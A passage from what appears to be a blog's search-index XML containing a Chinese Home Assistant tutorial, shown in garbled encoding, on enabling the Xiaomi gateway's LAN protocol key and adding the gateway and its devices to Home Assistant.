33%;" /></li><li>æŒ‰ç…§æ­¥éª¤ç‚¹å‡»å³å¯ï¼ŒHAä¼šè‡ªåŠ¨å‘ç°å±€åŸŸç½‘å†…çš„ç±³å®¶ç½‘å…³</li><li>æ·»åŠ å®Œæˆåï¼Œæ‰€æœ‰è”å…¥å°ç±³ç½‘å…³çš„è®¾å¤‡éƒ½ä¼šåœ¨<code>HA</code>ä¸­æ˜¾ç¤º.<br>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114730.png" alt="image-20210328114730867" style="zoom:33%;" /></li></ul><h1 id="è®¾å¤‡ä¸appé€‰æ‹©"><a href="#è®¾å¤‡ä¸appé€‰æ‹©" class="headerlink" title="è®¾å¤‡ä¸appé€‰æ‹©"></a>è®¾å¤‡ä¸appé€‰æ‹©</h1><p>ç»è¿‡æœ¬äººæµ‹è¯•ï¼Œèƒ½å¤Ÿæ¥å…¥<code>HA</code>çš„å°ç±³ç½‘å…³ï¼ˆå¿…é¡»è¦è·å–åˆ°<strong>å±€åŸŸç½‘é€šä¿¡åè®®å¯†é’¥</strong>ï¼‰æœ‰ä¸¤ç§ï¼š</p><ul><li>è€ç‰ˆå¤šåŠŸèƒ½ç½‘å…³ï¼Œç›®å‰åœ¨å„å¤§ç”µå•†å‡å·²æ–­è´§ï¼Œå¯ä»¥åœ¨é—²é±¼ä¸Šè´­ä¹°äºŒæ‰‹è®¾å¤‡ã€‚<br>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114748.png" alt="image-20210328114747988" style="zoom:33%;" /></li><li>ç©ºè°ƒä¼´ä¾£(å‡çº§ç‰ˆ)å¸¦ç½‘å…³:<a href="https://item.jd.com/100007226867.html">äº¬ä¸œé“¾æ¥</a></li></ul><p>è€Œå¯¹äºç±³å®¶appï¼Œç»è¿‡æˆ‘å®é™…æµ‹è¯•ä¸‹æ¥ï¼Œé™¤éæƒ³è¦æŒ‰ç…§è€ç‰ˆæœ¬çš„è·å–ç½‘å…³çš„æ–¹å¼ï¼Œå³ä¾¿æ˜¯ç°åœ¨æœ€æ–°ç‰ˆ(<code>5.7.5</code>)ä¹Ÿå¯ä»¥åœ¨ä¸Šè¿°çš„ç½‘å…³ä¸­è·å–åˆ°<strong>å±€åŸŸç½‘é€šä¿¡åè®®å¯†é’¥</strong>ã€‚</p><p>æˆ‘è¿™é‡Œä»¥<strong>ç©ºè°ƒä¼´ä¾£ç½‘å…³</strong>ä¸ºä¾‹ï¼š</p><ol><li>ç”¨ç±³å®¶appè¿æ¥ç©ºè°ƒä¼´ä¾£ï¼Œè¿›å…¥é€‰æ‹©ç½‘å…³ï¼Œç‚¹å‡»å³ä¸Šè§’ä¸‰ä¸ªç‚¹<br> <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114803.png" alt="image-20210328114803567" style="zoom: 25%;" /></li><li>é€‰æ‹©åŠŸèƒ½è®¾ç½®ï¼Œç„¶åç‹‚ç‚¹ä¸‹é¢çš„æ’ä»¶ç‰ˆæœ¬ï¼Œå³å¯çœ‹åˆ°å±€åŸŸç½‘é€šä¿¡åè®®<br> <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114852.png" alt="image-20210328114852542" style="zoom: 50%;" /></li><li>è¿›å…¥å±€åŸŸç½‘é€šä¿¡åè®®ï¼Œé€‰æ‹©å¼€å¯ï¼Œè®°ä½ç›¸åº”å¯†ç ï¼Œç‚¹å‡»ç¡®å®š<br> <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114916.png" alt="image-20210328114916794" style="zoom: 50%;" /></li></ol><p>å½“è·å–åˆ°å±€åŸŸç½‘é€šä¿¡å¯†é’¥åï¼Œå°±å¯ä»¥é€šè¿‡<code>HA</code>çš„æ·»åŠ è®¾å¤‡é¢æ¿æŒ‰ç…§æµç¨‹æ·»åŠ ç±³å®¶çš„ç½‘å…³äº†ï¼Œä¸€æ—¦ç½‘å…³æ·»åŠ æˆåŠŸï¼Œæ¥å…¥è¯¥ç½‘å…³çš„è®¾å¤‡ä¹Ÿä¼šæ˜¾ç¤ºã€‚</p>]]></content>
    
    
    <categories>
      
      <category>IoT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
      <tag>HomeAssistant</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
